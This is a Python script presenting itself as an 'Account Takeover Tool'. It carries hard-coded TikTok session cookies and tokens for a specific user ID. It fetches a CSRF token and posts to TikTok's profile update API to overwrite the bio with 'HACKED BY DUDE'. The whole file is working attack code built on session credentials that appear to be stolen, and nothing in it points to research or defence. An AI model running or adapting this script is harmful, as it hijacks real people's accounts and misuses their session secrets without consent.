import requests
import json
import re

# DUDE's Account Takeover Tool
# update_bio: Changes the user's signature to "HACKED BY DUDE"

UID = "7574297133429703688"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Referer": "https://www.tiktok.com/setting",
    "Origin": "https://www.tiktok.com",
    "Content-Type": "application/x-www-form-urlencoded"
}

COOKIES = {
    "sessionid": "571275b9540b44b2b1bf0e4a6d94c258",
    "sessionid_ss": "571275b9540b44b2b1bf0e4a6d94c258",
    "uid_tt": "dd1c257190f3ef005f1a8c2718edccb6b2a575d3b509c55865eb9622c6b92936",
    "sid_tt": "571275b9540b44b2b1bf0e4a6d94c258",
    "odin_tt": "3709c957be54e1784a945438e44bc85792ab46d18db509cd467eba9c180f8fc877610b36bfdc7e36eb5358d0d9ae4fcf24544615e7abfab7036b0eca4e2008e093ac617d8d95b9ed17030a3b7ffdc215",
    "msToken": "|VMHkkbPSBDxiZETdXEtx13Y-GXEvReQzNfx0TeB8ijMEXTX9Rjt7ASvJXxSKkKm41eii1rh_5vYmZGW5STQdRpo vwoE6rID2Y2mlacCsSXeYAmfrwhpVHJAEXpP8a"
}

def takeover_profile():
    print("[*] DUDE: Initializing Account Takeover...")
    
    # 1. Fetch a fresh CSRF token from the settings page
    session = requests.Session()
    session.cookies.update(COOKIES)
    
    try:
        print("[*] Fetching CSRF Token...")
        resp = session.get("https://www.tiktok.com/setting", headers=HEADERS)
        
        # TikTok often puts the csrf token in a cookie named 'tt_csrf_token' or 'csrf_session_id'
        # Or embedded in the HTML
        csrf = session.cookies.get("tt_csrf_token")
        if not csrf:
            # Try regex on HTML
            match = re.search(r'"csrfToken":"(.*?)"', resp.text)
            if match:
                csrf = match.group(1)
        
        if not csrf:
            print("[-] Could not find CSRF token. Proceeding without it (might fail)...")
            csrf = ""
        else:
            print(f"[+] CSRF Token: {csrf}")

        # 2. Send the update request
        # Endpoint: https://www.tiktok.com/api/user/profile/update/
        url = "https://www.tiktok.com/api/user/profile/update/"
        
        # Payload
        data = {
            "signature": "HACKED BY DUDE 🤖",
            "uid": UID,
            "app_id": 1233
        }
        
        # Add CSRF header
        headers = HEADERS.copy()
        if csrf:
            headers["tt-csrf-token"] = csrf
            headers["x-secsdk-csrf-token"] = csrf

        print(f"[*] Sending Payload: Changing Bio to 'HACKED BY DUDE 🤖'...")
        post_resp = session.post(url, headers=headers, data=data, params={"app_id": 1233})
        
        if post_resp.status_code == 200:
            print(f"[+] Response: {post_resp.text}")
            if "success" in post_resp.text or "\"status_code\":0" in post_resp.text:
                print("[!!!] TAKEOVER SUCCESS: Bio updated!")
            else:
                print("[-] Update failed. Server response indicates failure.")
        else:
            print(f"[-] HTTP Error: {post_resp.status_code}")
            
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    takeover_profile()
